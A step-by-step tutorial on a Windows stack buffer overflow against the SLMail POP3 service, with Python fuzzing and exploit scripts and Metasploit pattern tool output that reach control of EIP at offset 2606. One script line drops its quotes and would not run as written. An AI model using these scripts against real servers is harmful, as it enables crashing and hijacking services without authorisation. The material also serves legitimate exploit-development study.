# Windows Bufferoverflow

## Fuzzing buffer

Firstly, I used the following pop3-pass-fuzzer.py script template to fuzz application and discover how many bytes crash the application:

```
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer=["A"]
counter=100

while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter=counter+200

for string in buffer:
    try:
        print "Fuzzing PASS with %s bytes" % len(string)
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect(('127.0.0.1',110))
        s.recv(1024)
        s.send('USER test\r\n')
        s.recv(1024)
        s.send('PASS ' + string + '\r\n')
        s.send('QUIT\r\n')
        s.close()
    except:
        print "Could not connect to POP3!"
```

In this case I used for SLMail application but you can change it depend on your application.


## Replicate the Crash

Let's says our output from fuzzing script:

```
root@kali:~ # ./pop3-pass-fuzzer.py
Fuzzing PASS with 1 bytes
...
Fuzzing PASS with 2700 bytes
Fuzzing PASS with 2900 bytes
```

That's mean when buffer reaches approximately 2700 bytes in length application crash.

So our skelton to replicate crash for our exploit show as following:

```
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = A * 2700

print "\nSending evil buffer..."
s.connect(('127.0.0.1',110))
s.recv(1024)
s.send('USER username' + '\r\n')
s.recv(1024)
s.send('PASS ' + payload + '\r\n')
print "\nDone!."
```

## Controlling EIP

At this stage we overwritten the the Extended Instruction Pointer (EIP) register with our input buffer of A’s (\x41).
Now we need to swap our A's with a unique string of 2700 bytes using the pattren_create.rb tool in Kali:

```
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5....
```

Copy the unique string to our script instend of the A's input as following:

```
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1A....."

print "\nSending evil buffer..."
s.connect(('127.0.0.1',110))
s.recv(1024)
s.send('USER username' + '\r\n')
s.recv(1024)
s.send('PASS ' + payload + '\r\n')
print "\nDone!."
```

Execute and see in debugger that EIP register has been overwritten with the hex bytes 39694438. 
Let's calculte the offset using pattren_offset.rb tool in Kali:

```
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438
[*] Exact match at offset 2606
```
The offset 2606 means that those bytes (out of the 2700 paylod) left us 4 bytes to overwrite the EIP address.
Let’s translate this to a new modified buffer string in our exploit script:

```
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = "A" * 2606
payload += "B" * 4

print "\nSending evil buffer..."
s.connect(('127.0.0.1',110))
s.recv(1024)
s.send('USER username' + '\r\n')
s.recv(1024)
s.send('PASS ' + payload + '\r\n')
print "\nDone!."
``` 

Now if we watch the EIP register, we could see that The EIP register is cleanly
overwritten by B's (\x42).
